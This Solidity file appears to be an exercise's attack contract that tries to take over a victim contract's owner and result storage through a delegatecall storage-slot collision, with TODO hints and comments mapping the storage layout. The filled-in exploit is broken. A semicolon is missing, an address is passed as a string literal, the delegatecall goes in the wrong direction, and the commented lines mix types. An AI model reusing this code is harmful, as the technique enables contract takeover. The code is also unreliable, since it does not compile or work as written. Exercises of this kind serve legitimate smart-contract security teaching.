// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract
    uint256 var0 = 12345;
    uint8 var1 = 32;
    string private var2;
    address private var3;
    uint8 private var4;
    address public owner;
    mapping(address => bool) public result;

    constructor(address addr) payable {
        victim = addr;
    }

    // NOTE: You might need some malicious function here

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...

        bytes memory data = "0x5c9ce6944Fd488a33f437e86d85f1b496CdEeE9e"
        (bool success, ) = victim.delegatecall(abi.encodeWithSignature("proxyCall(bytes)", data));
        require(success, "call not successful");
        
        // uint256 var0             => slot 0 (32)
        // uint8 var1 = 32;         => slot 1 (1)
        // string private var2;     => slot 2 (32)
        // address private var3;    => slot 3 (20)
        // uint8 private var4;      => slot 3 (1)
        // address public owner;    => slot 4 (20)
        // mapping result;          => slot 5 (32)


        // address wallet = "<your wallet address>";
        // bytes32 secret = 0x000000000000000000000001+"<your wallet address(without \"0x\")>";
        // bytes memory data = abi.encodeWithSignature("proxyCall(bytes32)", victim);
        // (bool success, ) = address(victim).call(data);
        // require(success, "call not successful");
    }
}
